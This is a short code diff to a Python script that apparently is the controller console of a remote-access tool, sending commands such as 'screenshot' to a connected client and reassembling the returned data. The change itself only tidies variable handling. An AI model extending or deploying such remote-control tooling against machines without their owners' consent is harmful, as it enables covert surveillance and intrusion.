@@ -36,11 +36,11 @@ while True:
     command = input(Fore.LIGHTWHITE_EX + "\n > " + Fore.GREEN)
     if len(command) > 0:
         args = command.split(" ")
+        chunksout = ""
         if args[0] == "screenshot":
             send(command.encode())
             chunks = client.recv(HEADER).decode()
-            chunksout = ""
-            for i in range(int(chunks)):
+            for _ in range(int(chunks)):
                 chunksout += client.recv(HEADER).decode()
 
             with open('screenshot.png','wb') as ss:
@@ -57,8 +57,7 @@ while True:
             else:
                 send(command.encode())
             chunks = client.recv(HEADER).decode()
-            chunksout = ""
-            for i in range(int(chunks)):
+            for _ in range(int(chunks)):
                 chunksout += client.recv(HEADER).decode()
             chunksout = ast.literal_eval(chunksout)
             for chunk in chunksout:
